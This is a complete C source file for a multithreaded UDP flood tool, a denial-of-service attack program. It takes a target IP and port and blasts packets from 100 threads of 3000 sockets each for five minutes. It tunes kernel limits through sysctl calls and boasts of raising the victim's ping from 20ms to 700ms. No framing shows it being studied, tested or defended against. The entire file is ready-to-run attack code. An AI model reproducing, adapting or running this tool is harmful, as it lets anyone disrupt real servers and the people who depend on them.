#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>

#define RED "\033[1;31m"
#define CYAN "\033[1;36m"
#define YELLOW "\033[1;33m"
#define GREEN "\033[1;32m"
#define RESET "\033[0m"

#define MAX_SOCKETS 3000
#define PACKET_SIZE 1450
#define MAX_THREADS 100
#define DURATION 300 // 5 minutes

volatile sig_atomic_t running = 1;
struct sockaddr_in target;

// Signal handler for instant cleanup
void handle_signal(int sig) {
    running = 0;
}

// AM Banner
void show_banner() {
    printf(RED "\n"
"     █████╗ ███╗   ███╗\n"
"    ██╔══██╗████╗ ████║\n"
"    ███████║██╔████╔██║\n"
"    ██╔══██║██║╚██╔╝██║\n"
"    ██║  ██║██║ ╚═╝ ██║\n"
"    ╚═╝  ╚═╝╚═╝     ╚═╝\n"
YELLOW "►► INSTANT IMPACT UDP FLOOD ◄◄\n" RESET);
}

void configure_socket(int sock) {
    int buf_size = 16777216; // 16MB buffer
    int opt = 1;
    
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    fcntl(sock, F_SETFL, O_NONBLOCK);
}

void* attack_thread(void *arg) {
    int socks[MAX_SOCKETS];
    char packet[PACKET_SIZE];
    
    // Pre-initialize sockets
    for(int i=0; i<MAX_SOCKETS; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM | SOCK_NONBLOCK, 0);
        if(socks[i] != -1) configure_socket(socks[i]);
    }

    // Maximum CPU priority
    nice(-20);
    
    while(running) {
        for(int i=0; i<MAX_SOCKETS; i++) {
            if(socks[i] != -1) {
                sendto(socks[i], packet, sizeof(packet), 0,
                     (struct sockaddr*)&target, sizeof(target));
            }
        }
        usleep(2500); // 2.5ms interval
    }
    
    // Instant cleanup
    for(int i=0; i<MAX_SOCKETS; i++) 
        if(socks[i] != -1) close(socks[i]);
    
    return NULL;
}

void start_attack() {
    pthread_t tid[MAX_THREADS];
    
    printf(CYAN "\n[+] Target: %s:%d\n", inet_ntoa(target.sin_addr), ntohs(target.sin_port));
    printf("[+] Threads: %d\n[+] Sockets: %d/thread\n", MAX_THREADS, MAX_SOCKETS);
    printf("[+] Expected Impact: 20ms → 700ms in 1 second\n");
    
    for(int i=0; i<MAX_THREADS; i++)
        pthread_create(&tid[i], NULL, attack_thread, NULL);

    printf(YELLOW "\n[Status] ");
    for(int i=0; i<DURATION && running; i++) {
        printf("⚡");
        fflush(stdout);
        sleep(1);
    }
    
    running = 0;
    for(int i=0; i<MAX_THREADS; i++)
        pthread_join(tid[i], NULL);
}

int main(int argc, char *argv[]) {
    if(argc !=3) {
        printf(RED "\nUsage: %s <IP> <PORT>\n" RESET, argv[0]);
        return 1;
    }

    // Register signal handlers
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    // Kernel Tuning
    system("sysctl -w net.ipv4.udp_mem='16777216 33554432 67108864'");
    system("sysctl -w net.core.rmem_max=67108864");
    system("sysctl -w net.core.wmem_max=67108864");
    
    struct rlimit lim = {MAX_SOCKETS*MAX_THREADS*4, MAX_SOCKETS*MAX_THREADS*4};
    setrlimit(RLIMIT_NOFILE, &lim);

    target.sin_family = AF_INET;
    target.sin_port = htons(atoi(argv[2]));
    inet_pton(AF_INET, argv[1], &target.sin_addr);

    show_banner();
    start_attack();
    
    printf(GREEN "\n[+] Resources freed - Ping normalized in 1-2 seconds\n" RESET);
    return 0;
}